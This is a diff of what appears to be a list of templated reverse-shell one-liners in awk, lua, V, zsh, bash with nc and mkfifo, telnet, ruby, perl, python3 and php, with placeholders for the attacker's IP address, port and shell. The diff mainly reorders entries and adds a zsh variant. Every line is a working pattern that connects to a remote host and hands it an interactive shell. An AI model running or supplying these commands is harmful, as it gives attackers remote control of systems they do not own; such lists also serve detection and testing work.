@@ -1,10 +1,11 @@
+awk 'BEGIN {VARIABLE_NAME_1 = "/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER"; while(FD_NUMBER) { do{ printf "shell>" |& VARIABLE_NAME_1; VARIABLE_NAME_1 |& getline VARIABLE_NAME_2; if(VARIABLE_NAME_2){ while ((VARIABLE_NAME_2 |& getline) > 0) print $0 |& VARIABLE_NAME_1; close(VARIABLE_NAME_2); } } while(VARIABLE_NAME_2 != "exit") close(VARIABLE_NAME_1); }}' /dev/null
+lua -e "require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER');os.execute('NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER');
+echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system("nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER 0>&1") }' >> FILE_PATH.v && v run FILE_PATH.v && rm FILE_PATH.v
+zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH
 rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc -u IP_ADDRESS PORT_NUMBER >FILE_PATH
 VARIABLE_NAME=$(mktemp -u);mkfifo $VARIABLE_NAME && telnet IP_ADDRESS PORT_NUMBER 0<$VARIABLE_NAME | NIX_SHELL 1>$VARIABLE_NAME
 ruby -rsocket -e'spawn("NIX_SHELL",[:in,:out,:err]=>TCPSocket.new("IP_ADDRESS",PORT_NUMBER))'
 perl -e 'use Socket;$VARIABLE_NAME_1="IP_ADDRESS";$VARIABLE_NAME_2=PORT_NUMBER;socket(S,PF_INET,SOCK_STREAM,getprotobyname("PROTOCOL_TYPE"));if(connect(S,sockaddr_in($VARIABLE_NAME_1,inet_aton($VARIABLE_NAME_2)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("NIX_SHELL -i");};'
-rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("NIX_SHELL")'
 php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);popen("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER", "r");'
-awk 'BEGIN {VARIABLE_NAME_1 = "/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER"; while(FD_NUMBER) { do{ printf "shell>" |& VARIABLE_NAME_1; VARIABLE_NAME_1 |& getline VARIABLE_NAME_2; if(VARIABLE_NAME_2){ while ((VARIABLE_NAME_2 |& getline) > 0) print $0 |& VARIABLE_NAME_1; close(VARIABLE_NAME_2); } } while(VARIABLE_NAME_2 != "exit") close(VARIABLE_NAME_1); }}' /dev/null
-lua -e "require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER');os.execute('NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER');
-echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system("nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER 0>&1") }' >> FILE_PATH.v && v run FILE_PATH.v && rm FILE_PATH.v
